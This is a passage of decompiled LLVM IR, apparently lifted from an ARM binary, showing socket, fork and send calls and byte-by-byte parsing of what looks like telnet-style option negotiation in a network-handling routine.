  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13610 = load i32, i32* @r5, align 4
  %v1_13610 = add i32 %v0_13610, 4
  %v2_13610 = inttoptr i32 %v1_13610 to i32*
  %v3_13610 = load i32, i32* %v2_13610, align 4
  store i32 %v3_13610, i32* %r0.global-to-local, align 4
  %v4_13614 = call i32 @_send(i32 %v3_13610, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1361c = call i32 @function_13c30(i32 23)
  store i32 %v1_1361c, i32* %r0.global-to-local, align 4
  %v0_13620 = load i32, i32* @r5, align 4
  %v1_13620 = add i32 %v0_13620, 24
  %v2_13620 = inttoptr i32 %v1_13620 to i32*
  %v3_13620 = load i32, i32* %v2_13620, align 4
  store i32 %v3_13620, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_13628 = add i32 %v0_13620, 12
  %v3_13628 = inttoptr i32 %v2_13628 to i32*
  store i32 9, i32* %v3_13628, align 4
  br label %dec_label_pc_13818

dec_label_pc_13630:                               ; preds = %dec_label_pc_130cc
  %v1_13630 = add i32 %v0_130cc, 24
  %v2_13630 = inttoptr i32 %v1_13630 to i32*
  %v3_13630 = load i32, i32* %v2_13630, align 4
  store i32 %v3_13630, i32* %ip.global-to-local, align 4
  %v1_13634 = add i32 %v3_13630, -1
  store i32 %v1_13634, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13638 = icmp eq i32 %v1_13634, 0
  store i1 %v2_13638, i1* %cpsr_z.global-to-local, align 1
  %v5_1363c = icmp sgt i32 %v1_13634, 0
  br i1 %v5_1363c, label %dec_label_pc_13664, label %dec_label_pc_1304cthread-pre-split.thread

dec_label_pc_13644:                               ; preds = %bb332
  %v2_13644 = icmp ugt i8 %v3_13668, 35
  store i1 %v2_13644, i1* %cpsr_c.global-to-local, align 1
  %v7_13644 = icmp eq i8 %v3_13668, 36
  store i1 %v7_13644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13644, label %dec_label_pc_13678, label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13644
  %v2_1364c = icmp ugt i8 %v3_13668, 34
  store i1 %v2_1364c, i1* %cpsr_c.global-to-local, align 1
  %v7_1364c = icmp eq i8 %v3_13668, 35
  store i1 %v7_1364c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1364c, label %dec_label_pc_13678, label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %dec_label_pc_1364c
  %v2_13654 = icmp ugt i8 %v3_13668, 36
  store i1 %v2_13654, i1* %cpsr_c.global-to-local, align 1
  %v7_13654 = icmp eq i8 %v3_13668, 37
  store i1 %v7_13654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13654, label %dec_label_pc_13678, label %dec_label_pc_1365c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13654
  %v1_1365c = add i32 %v0_13678, -1
  store i32 %v1_1365c, i32* %r0.global-to-local, align 4
  %v2_1365c = icmp ne i32 %v0_13678, 0
  store i1 %v2_1365c, i1* %cpsr_c.global-to-local, align 1
  %v7_1365c = icmp eq i32 %v0_13678, 1
  store i1 %v7_1365c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1365c, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_13664

dec_label_pc_13664:                               ; preds = %dec_label_pc_13630, %dec_label_pc_1365c
  %v0_13678 = phi i32 [ %v1_1365c, %dec_label_pc_1365c ], [ %v1_13634, %dec_label_pc_13630 ]
  %v2_13664 = add i32 %v0_13678, %v0_130cc
  store i32 %v2_13664, i32* %r3.global-to-local, align 4
  %v1_13668 = add i32 %v2_13664, 28
  %v2_13668 = inttoptr i32 %v1_13668 to i8*
  %v3_13668 = load i8, i8* %v2_13668, align 1
  %v4_13668 = zext i8 %v3_13668 to i32
  store i32 %v4_13668, i32* %r3.global-to-local, align 4
  %v2_1366c = icmp ugt i8 %v3_13668, 61
  store i1 %v2_1366c, i1* %cpsr_c.global-to-local, align 1
  %v7_1366c = icmp eq i8 %v3_13668, 62
  store i1 %v7_1366c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1366c, label %dec_label_pc_13678, label %bb332

bb332:                                            ; preds = %dec_label_pc_13664
  %v3_13670 = icmp ugt i8 %v3_13668, 57
  store i1 %v3_13670, i1* %cpsr_c.global-to-local, align 1
  %v8_13670 = icmp eq i8 %v3_13668, 58
  store i1 %v8_13670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13670, label %dec_label_pc_13678, label %dec_label_pc_13644

dec_label_pc_13678:                               ; preds = %dec_label_pc_13664, %bb332, %dec_label_pc_13654, %dec_label_pc_1364c, %dec_label_pc_13644
  %v1_13678 = add i32 %v0_13678, 1
  store i32 %v1_13678, i32* @r7, align 4
  %v2_1367c = icmp eq i32 %v1_13678, -1
  store i1 %v2_1367c, i1* %cpsr_c.global-to-local, align 1
  %v7_1367c = icmp eq i32 %v0_13678, -2
  store i1 %v7_1367c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1367c, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_13684

dec_label_pc_13684:                               ; preds = %dec_label_pc_13678
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13684 = icmp eq i32 %v1_13678, 0
  store i1 %v2_13684, i1* %cpsr_z.global-to-local, align 1
  %tmp333 = icmp slt i32 %v1_13678, 1
  br i1 %tmp333, label %dec_label_pc_131dc, label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13684
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_13690 = call i32 @function_13ce8(i32 20)
  store i32 %v2_13530, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_136a0 = call i32 @function_13c04(i32 20, i32* nonnull %stack_var_-48)
  store i32 %v3_136a0, i32* %r0.global-to-local, align 4
  %v3_136a4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_136a4, i32* %r2.global-to-local, align 4
  store i32 %v3_136a0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_136b0 = load i32, i32* @r5, align 4
  %v1_136b0 = add i32 %v0_136b0, 4
  %v2_136b0 = inttoptr i32 %v1_136b0 to i32*
  %v3_136b0 = load i32, i32* %v2_136b0, align 4
  store i32 %v3_136b0, i32* %r0.global-to-local, align 4
  %v4_136b4 = call i32 @_send(i32 %v3_136b0, i32 %v3_136a0, i32 %v3_136a4, i32 16384)
  store i32 %v4_136b4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_136c4 = load i32, i32* @r5, align 4
  %v1_136c4 = add i32 %v0_136c4, 4
  %v2_136c4 = inttoptr i32 %v1_136c4 to i32*
  %v3_136c4 = load i32, i32* %v2_136c4, align 4
  store i32 %v3_136c4, i32* %r0.global-to-local, align 4
  %v4_136c8 = call i32 @_send(i32 %v3_136c4, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_136d0 = call i32 @function_13c30(i32 20)
  store i32 %v1_136d0, i32* %r0.global-to-local, align 4
  %v0_136d4 = load i32, i32* @r5, align 4
  %v1_136d4 = add i32 %v0_136d4, 24
  %v2_136d4 = inttoptr i32 %v1_136d4 to i32*
  %v3_136d4 = load i32, i32* %v2_136d4, align 4
  store i32 %v3_136d4, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_136dc = add i32 %v0_136d4, 12
  %v3_136dc = inttoptr i32 %v2_136dc to i32*
  store i32 8, i32* %v3_136dc, align 4
  br label %dec_label_pc_13818

dec_label_pc_136e4:                               ; preds = %dec_label_pc_130cc
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_136e8 = call i32 @function_13ce8(i32 26)
  store i32 %v2_1347c, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_136f8 = call i32 @function_13c04(i32 26, i32* nonnull %stack_var_-56)
  %v3_136fc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_136f8, i32* %r2.global-to-local, align 4
  %v1_13704 = add i32 %v3_136fc, -1
  store i32 %v1_13704, i32* %r3.global-to-local, align 4
  %v0_13708 = load i32, i32* @sb, align 4
  store i32 %v0_13708, i32* %r0.global-to-local, align 4
  %v0_1370c = load i32, i32* @r5, align 4
  %v1_1370c = add i32 %v0_1370c, 24
  %v2_1370c = inttoptr i32 %v1_1370c to i32*
  %v3_1370c = load i32, i32* %v2_1370c, align 4
  store i32 %v3_1370c, i32* %r1.global-to-local, align 4
  %v4_13710 = call i32 @function_146d0(i32 %v0_13708, i32 %v3_1370c, i32 %v3_136f8, i32 %v1_13704)
  %v3_13714 = icmp eq i32 %v4_13710, -1
  store i1 %v3_13714, i1* %cpsr_c.global-to-local, align 1
  %v8_13714 = icmp eq i32 %v4_13710, -1
  store i1 %v8_13714, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_13720 = call i32 @function_13c30(i32 26)
  br i1 %v3_13714, label %dec_label_pc_1371c, label %dec_label_pc_13950

dec_label_pc_1371c:                               ; preds = %dec_label_pc_136e4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_13728 = call i32 @function_13ce8(i32 25)
  store i32 %v2_1347c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_13738 = call i32 @function_13c04(i32 25, i32* nonnull %stack_var_-56)
  store i32 %v3_13738, i32* %r0.global-to-local, align 4
  %v3_1373c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_13738, i32* %r2.global-to-local, align 4
  %v1_13744 = add i32 %v3_1373c, -1
  store i32 %v1_13744, i32* %r3.global-to-local, align 4
  %v0_13748 = load i32, i32* @r5, align 4
  %v1_13748 = add i32 %v0_13748, 24
  %v2_13748 = inttoptr i32 %v1_13748 to i32*
  %v3_13748 = load i32, i32* %v2_13748, align 4
  store i32 %v3_13748, i32* %r1.global-to-local, align 4
  %v0_1374c = load i32, i32* @sb, align 4
  store i32 %v0_1374c, i32* %r0.global-to-local, align 4
  %v4_13750 = call i32 @function_146d0(i32 %v0_1374c, i32 %v3_13748, i32 %v3_13738, i32 %v1_13744)
  store i32 %v4_13750, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1375c = call i32 @function_13c30(i32 25)
  store i32 %v1_1375c, i32* %r0.global-to-local, align 4
  %v0_13760 = load i32, i32* @r7, align 4
  %v2_13760 = icmp eq i32 %v0_13760, -1
  store i1 %v2_13760, i1* %cpsr_c.global-to-local, align 1
  %v7_13760 = icmp eq i32 %v0_13760, -1
  store i1 %v7_13760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13760, label %dec_label_pc_13048.loopexit, label %dec_label_pc_13768

dec_label_pc_13768:                               ; preds = %dec_label_pc_1371c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13768 = icmp eq i32 %v0_13760, 0
  store i1 %v2_13768, i1* %cpsr_z.global-to-local, align 1
  %tmp334 = icmp slt i32 %v0_13760, 1
  br i1 %tmp334, label %dec_label_pc_131dc, label %dec_label_pc_13770

dec_label_pc_13770:                               ; preds = %dec_label_pc_13768
  %v0_13770 = load i32, i32* @r5, align 4
  %v1_13770 = add i32 %v0_13770, 21
  %v2_13770 = inttoptr i32 %v1_13770 to i8*
  %v3_13770 = load i8, i8* %v2_13770, align 1
  %v4_13770 = zext i8 %v3_13770 to i32
  store i32 %v4_13770, i32* %r3.global-to-local, align 4
  %v1_13774 = add i32 %v0_13770, 20
  %v2_13774 = inttoptr i32 %v1_13774 to i8*
  %v3_13774 = load i8, i8* %v2_13774, align 1
  %v4_13774 = zext i8 %v3_13774 to i32
  store i32 %v4_13774, i32* %r2.global-to-local, align 4
  %v1_13778 = add i32 %v0_13770, 16
  %v2_13778 = inttoptr i32 %v1_13778 to i32*
  %v3_13778 = load i32, i32* %v2_13778, align 4
  store i32 %v3_13778, i32* %r1.global-to-local, align 4
  %v4_1377c = mul nuw nsw i32 %v4_13770, 256
  %v5_1377c = or i32 %v4_13774, %v4_1377c
  store i32 %v5_1377c, i32* %r2.global-to-local, align 4
  %v1_13780 = and i32 %v4_13774, 128
  %v2_13780 = icmp ne i32 %v1_13780, 0
  store i1 %v2_13780, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_13770, i32* %r3.global-to-local, align 4
  store i32 %v3_13778, i32* %stack_var_-48, align 4
  store i32 %v5_1377c, i32* %stack_var_-38, align 4
  %v1_13790 = inttoptr i32 %v0_13770 to i32*
  %v2_13790 = load i32, i32* %v1_13790, align 4
  store i32 %v2_13790, i32* @fp, align 4
  %v0_13794 = call i32 @_fork()
  store i32 %v0_13794, i32* %r0.global-to-local, align 4
  %v7_13798 = icmp eq i32 %v0_13794, -1
  %.350 = zext i1 %v7_13798 to i32
  store i32 %.350, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_137a4 = icmp eq i32 %v0_13794, 0
  store i1 %v2_137a4, i1* %cpsr_z.global-to-local, align 1
  %tmp337 = icmp slt i32 %v0_13794, 1
  br i1 %tmp337, label %bb338, label %.thread68

.thread68:                                        ; preds = %dec_label_pc_13770
  store i32 1, i32* %sl.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_137fc

bb338:                                            ; preds = %dec_label_pc_13770
  store i32 %.350, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_137b0 = icmp eq i1 %v7_13798, false
  store i1 %v2_137b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137b0, label %dec_label_pc_137b8, label %dec_label_pc_137fc

dec_label_pc_137b8:                               ; preds = %bb338
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_137c4 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_137c4, i32* %r0.global-to-local, align 4
  %v2_137c8 = icmp eq i32 %v3_137c4, -1
  store i1 %v2_137c8, i1* %cpsr_c.global-to-local, align 1
  %v7_137c8 = icmp eq i32 %v3_137c4, -1
  store i1 %v7_137c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_137c4, i32* @r6, align 4
  br i1 %v7_137c8, label %dec_label_pc_13bfc, label %dec_label_pc_137d4

dec_label_pc_137d4:                               ; preds = %dec_label_pc_137b8
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_137d8 = call i32 @function_13ce8(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_137e0 = call i32 @function_13ce8(i32 19)
  %v0_137e4 = load i32, i32* @sl, align 4
  store i32 %v0_137e4, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_137ec = inttoptr i32 %v0_137e4 to i32*
  %v3_137ec = call i32 @function_13c04(i32 18, i32* %v2_137ec)
  store i32 %v3_137ec, i32* %r0.global-to-local, align 4
  %v1_137f0 = inttoptr i32 %v3_137ec to i8*
  %v2_137f0 = call i32 @function_11ac0(i8* %v1_137f0)
  store i32 %v2_137f0, i32* %r0.global-to-local, align 4
  store i32 %v2_137f0, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_137f4 = icmp eq i32 %v2_137f0, 0
  store i1 %v3_137f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_137f4, label %dec_label_pc_137fc, label %dec_label_pc_13acc

dec_label_pc_137fc:                               ; preds = %.thread68, %dec_label_pc_137d4, %bb338
  %v0_137fc = load i32, i32* @r5, align 4
  %v1_137fc = add i32 %v0_137fc, 4
  %v2_137fc = inttoptr i32 %v1_137fc to i32*
  %v3_137fc = load i32, i32* %v2_137fc, align 4
  store i32 %v3_137fc, i32* %r0.global-to-local, align 4
  %v1_13800 = call i32 @_close(i32 %v3_137fc)
  store i32 %v1_13800, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1380c = load i32, i32* @r5, align 4
  %v1_1380c = add i32 %v0_1380c, 24
  %v2_1380c = inttoptr i32 %v1_1380c to i32*
  %v3_1380c = load i32, i32* %v2_1380c, align 4
  store i32 %v3_1380c, i32* %ip.global-to-local, align 4
  %v2_13810 = add i32 %v0_1380c, 4
  %v3_13810 = inttoptr i32 %v2_13810 to i32*
  store i32 -1, i32* %v3_13810, align 4
  %v0_13814 = load i32, i32* %r2.global-to-local, align 4
  %v1_13814 = load i32, i32* @r5, align 4
  %v2_13814 = add i32 %v1_13814, 12
  %v3_13814 = inttoptr i32 %v2_13814 to i32*
  store i32 %v0_13814, i32* %v3_13814, align 4
  br label %dec_label_pc_13818

dec_label_pc_13818:                               ; preds = %.thread204, %dec_label_pc_13898, %dec_label_pc_13a68, %dec_label_pc_13980, %dec_label_pc_1368c, %dec_label_pc_135d8, %dec_label_pc_13524, %dec_label_pc_13470, %dec_label_pc_133d8, %dec_label_pc_13248, %dec_label_pc_131e4, %dec_label_pc_137fc
  %v0_13818 = load i32, i32* %ip.global-to-local, align 4
  %v1_13818 = load i32, i32* @r7, align 4
  %v2_13818 = sub i32 %v0_13818, %v1_13818
  %v3_13818 = icmp uge i32 %v0_13818, %v1_13818
  store i1 %v3_13818, i1* %cpsr_c.global-to-local, align 1
  %v4_13818 = xor i32 %v1_13818, %v0_13818
  %v5_13818 = xor i32 %v2_13818, %v0_13818
  %v6_13818 = and i32 %v5_13818, %v4_13818
  %v7_13818 = icmp slt i32 %v6_13818, 0
  %v8_13818 = icmp slt i32 %v2_13818, 0
  %v9_13818 = icmp eq i32 %v0_13818, %v1_13818
  store i1 %v9_13818, i1* %cpsr_z.global-to-local, align 1
  %v2_1381c = xor i1 %v8_13818, %v7_13818
  %v0_13818.v1_13818 = select i1 %v2_1381c, i32 %v0_13818, i32 %v1_13818
  store i32 %v0_13818.v1_13818, i32* %r1.global-to-local, align 4
  %v2_13824 = sub i32 %v0_13818, %v0_13818.v1_13818
  store i32 %v2_13824, i32* %r2.global-to-local, align 4
  %v1_13828 = load i32, i32* @r5, align 4
  %v2_13828 = add i32 %v1_13828, 24
  %v3_13828 = inttoptr i32 %v2_13828 to i32*
  store i32 %v2_13824, i32* %v3_13828, align 4
  %v0_1382c = load i32, i32* @sb, align 4
  %v1_1382c = load i32, i32* %r1.global-to-local, align 4
  %v2_1382c = add i32 %v1_1382c, %v0_1382c
  store i32 %v2_1382c, i32* %r1.global-to-local, align 4
  store i32 %v0_1382c, i32* %r0.global-to-local, align 4
  %v3_13834 = call i32 @_memmove(i32 %v0_1382c, i32 %v2_1382c, i32 %v2_13824)
  store i32 %v3_13834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_130cc

dec_label_pc_1383c:                               ; preds = %dec_label_pc_130cc
  %v1_1383c = add i32 %v0_130cc, 24
  %v2_1383c = inttoptr i32 %v1_1383c to i32*
  %v3_1383c = load i32, i32* %v2_1383c, align 4
  store i32 %v3_1383c, i32* %ip.global-to-local, align 4
  %v1_13840 = add i32 %v3_1383c, -1
  store i32 %v1_13840, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13844 = icmp eq i32 %v1_13840, 0
  store i1 %v2_13844, i1* %cpsr_z.global-to-local, align 1
  %v5_13848 = icmp sgt i32 %v1_13840, 0
  br i1 %v5_13848, label %dec_label_pc_13870, label %dec_label_pc_1304cthread-pre-split.thread

dec_label_pc_13850:                               ; preds = %bb341
  %v2_13850 = icmp ugt i8 %v3_13874, 35
  store i1 %v2_13850, i1* %cpsr_c.global-to-local, align 1
  %v7_13850 = icmp eq i8 %v3_13874, 36
  store i1 %v7_13850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13850, label %dec_label_pc_13884, label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %dec_label_pc_13850
  %v2_13858 = icmp ugt i8 %v3_13874, 34
  store i1 %v2_13858, i1* %cpsr_c.global-to-local, align 1
  %v7_13858 = icmp eq i8 %v3_13874, 35
  store i1 %v7_13858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13858, label %dec_label_pc_13884, label %dec_label_pc_13860

dec_label_pc_13860:                               ; preds = %dec_label_pc_13858
  %v2_13860 = icmp ugt i8 %v3_13874, 36
  store i1 %v2_13860, i1* %cpsr_c.global-to-local, align 1
  %v7_13860 = icmp eq i8 %v3_13874, 37
  store i1 %v7_13860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13860, label %dec_label_pc_13884, label %dec_label_pc_13868

dec_label_pc_13868:                               ; preds = %dec_label_pc_13860
  %v1_13868 = add i32 %v0_13884, -1
  store i32 %v1_13868, i32* %r0.global-to-local, align 4
  %v2_13868 = icmp ne i32 %v0_13884, 0
  store i1 %v2_13868, i1* %cpsr_c.global-to-local, align 1
  %v7_13868 = icmp eq i32 %v0_13884, 1
  store i1 %v7_13868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13868, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_13870

dec_label_pc_13870:                               ; preds = %dec_label_pc_1383c, %dec_label_pc_13868
  %v0_13884 = phi i32 [ %v1_13868, %dec_label_pc_13868 ], [ %v1_13840, %dec_label_pc_1383c ]
  %v2_13870 = add i32 %v0_13884, %v0_130cc
  store i32 %v2_13870, i32* %r3.global-to-local, align 4
  %v1_13874 = add i32 %v2_13870, 28
  %v2_13874 = inttoptr i32 %v1_13874 to i8*
  %v3_13874 = load i8, i8* %v2_13874, align 1
  %v4_13874 = zext i8 %v3_13874 to i32
  store i32 %v4_13874, i32* %r3.global-to-local, align 4
  %v2_13878 = icmp ugt i8 %v3_13874, 61
  store i1 %v2_13878, i1* %cpsr_c.global-to-local, align 1
  %v7_13878 = icmp eq i8 %v3_13874, 62
  store i1 %v7_13878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13878, label %dec_label_pc_13884, label %bb341

bb341:                                            ; preds = %dec_label_pc_13870
  %v3_1387c = icmp ugt i8 %v3_13874, 57
  store i1 %v3_1387c, i1* %cpsr_c.global-to-local, align 1
  %v8_1387c = icmp eq i8 %v3_13874, 58
  store i1 %v8_1387c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1387c, label %dec_label_pc_13884, label %dec_label_pc_13850

dec_label_pc_13884:                               ; preds = %dec_label_pc_13870, %bb341, %dec_label_pc_13860, %dec_label_pc_13858, %dec_label_pc_13850
  %v1_13884 = add i32 %v0_13884, 1
  store i32 %v1_13884, i32* @r7, align 4
  %v2_13888 = icmp eq i32 %v1_13884, -1
  store i1 %v2_13888, i1* %cpsr_c.global-to-local, align 1
  %v7_13888 = icmp eq i32 %v0_13884, -2
  store i1 %v7_13888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13888, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %dec_label_pc_13884
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13890 = icmp eq i32 %v1_13884, 0
  store i1 %v2_13890, i1* %cpsr_z.global-to-local, align 1
  %tmp342 = icmp slt i32 %v1_13884, 1
  br i1 %tmp342, label %dec_label_pc_131dc, label %dec_label_pc_13898

dec_label_pc_13898:                               ; preds = %dec_label_pc_13890
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_1389c = call i32 @function_13ce8(i32 24)
  store i32 %v2_1347c, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_138ac = call i32 @function_13c04(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_138ac, i32* %r0.global-to-local, align 4
  %v3_138b0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_138b0, i32* %r2.global-to-local, align 4
  store i32 %v3_138ac, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_138bc = load i32, i32* @r5, align 4
  %v1_138bc = add i32 %v0_138bc, 4
  %v2_138bc = inttoptr i32 %v1_138bc to i32*
  %v3_138bc = load i32, i32* %v2_138bc, align 4
  store i32 %v3_138bc, i32* %r0.global-to-local, align 4
  %v4_138c0 = call i32 @_send(i32 %v3_138bc, i32 %v3_138ac, i32 %v3_138b0, i32 16384)
  store i32 %v4_138c0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_138d0 = load i32, i32* @r5, align 4
  %v1_138d0 = add i32 %v0_138d0, 4
  %v2_138d0 = inttoptr i32 %v1_138d0 to i32*
  %v3_138d0 = load i32, i32* %v2_138d0, align 4
  store i32 %v3_138d0, i32* %r0.global-to-local, align 4
  %v4_138d4 = call i32 @_send(i32 %v3_138d0, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_138dc = call i32 @function_13c30(i32 24)
  store i32 %v1_138dc, i32* %r0.global-to-local, align 4
  %v0_138e0 = load i32, i32* @r5, align 4
  %v1_138e0 = add i32 %v0_138e0, 24
  %v2_138e0 = inttoptr i32 %v1_138e0 to i32*
  %v3_138e0 = load i32, i32* %v2_138e0, align 4
  store i32 %v3_138e0, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_138e8 = add i32 %v0_138e0, 12
  %v3_138e8 = inttoptr i32 %v2_138e8 to i32*
  store i32 10, i32* %v3_138e8, align 4
  br label %dec_label_pc_13818

dec_label_pc_138f0:                               ; preds = %dec_label_pc_1315c
  store i32 ptrtoint (i32* @global_var_15219.388 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_13114, i32* %r0.global-to-local, align 4
  %v3_138fc = call i32 @_memcpy(i32 %v2_13114, i32 ptrtoint (i32* @global_var_15219.388 to i32), i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_13908, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15210.390 to i32), i32* %r1.global-to-local, align 4
  %v3_13910 = call i32 @_memcpy(i32 %v2_13908, i32 ptrtoint (i32* @global_var_15210.390 to i32), i32 9)
  store i32 %v3_13910, i32* %r0.global-to-local, align 4
  %v0_13914 = load i32, i32* @r5, align 4
  %v1_13914 = add i32 %v0_13914, 24
  %v2_13914 = inttoptr i32 %v1_13914 to i32*
  %v3_13914 = load i32, i32* %v2_13914, align 4
  store i32 %v3_13914, i32* %ip.global-to-local, align 4
  %v0_13918 = load i32, i32* @r6, align 4
  %v1_13918 = add i32 %v0_13918, 2
  store i32 %v1_13918, i32* %r2.global-to-local, align 4
  %v0_1391c = load i32, i32* @sb, align 4
  %v2_1391c = add i32 %v0_1391c, %v3_13914
  store i32 %v2_1391c, i32* %r3.global-to-local, align 4
  %v3_13920 = icmp uge i32 %v2_1391c, %v1_13918
  store i1 %v3_13920, i1* %cpsr_c.global-to-local, align 1
  %v9_13920 = icmp eq i32 %v2_1391c, %v1_13918
  store i1 %v9_13920, i1* %cpsr_z.global-to-local, align 1
  %v2_13924 = xor i1 %v3_13920, true
  %v3_13924 = or i1 %v9_13920, %v2_13924
  br i1 %v3_13924, label %dec_label_pc_138f0.dec_label_pc_131cc.loopexit_crit_edge, label %dec_label_pc_13928

dec_label_pc_138f0.dec_label_pc_131cc.loopexit_crit_edge: ; preds = %dec_label_pc_138f0
  %v0_131cc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_131cc

dec_label_pc_13928:                               ; preds = %dec_label_pc_138f0
  %v0_13928 = load i32, i32* @r4, align 4
  %v1_13928 = add i32 %v0_13928, 1
  %v2_13928 = inttoptr i32 %v1_13928 to i8*
  %v3_13928 = load i8, i8* %v2_13928, align 1
  %v4_13928 = zext i8 %v3_13928 to i32
  store i32 %v4_13928, i32* %r3.global-to-local, align 4
  %v2_1392c = icmp ugt i8 %v3_13928, 30
  store i1 %v2_1392c, i1* %cpsr_c.global-to-local, align 1
  %v7_1392c = icmp eq i8 %v3_13928, 31
  store i1 %v7_1392c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1392c, label %dec_label_pc_13a1c, label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %dec_label_pc_13928
  %v1_13934 = add i32 %v0_13928, -1
  %v2_13934 = inttoptr i32 %v1_13934 to i8*
  %v3_13934 = load i8, i8* %v2_13934, align 1
  %v4_13934 = zext i8 %v3_13934 to i32
  store i32 %v4_13934, i32* %r3.global-to-local, align 4
  %v2_13938 = icmp ugt i8 %v3_13934, -4
  store i1 %v2_13938, i1* %cpsr_c.global-to-local, align 1
  %v7_13938 = icmp eq i8 %v3_13934, -3
  store i1 %v7_13938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13938, label %bb343, label %dec_label_pc_13944

bb343:                                            ; preds = %dec_label_pc_13934
  %v1_1393c = load i32, i32* @r8, align 4
  %v2_1393c = trunc i32 %v1_1393c to i8
  store i8 %v2_1393c, i8* %v2_13934, align 1
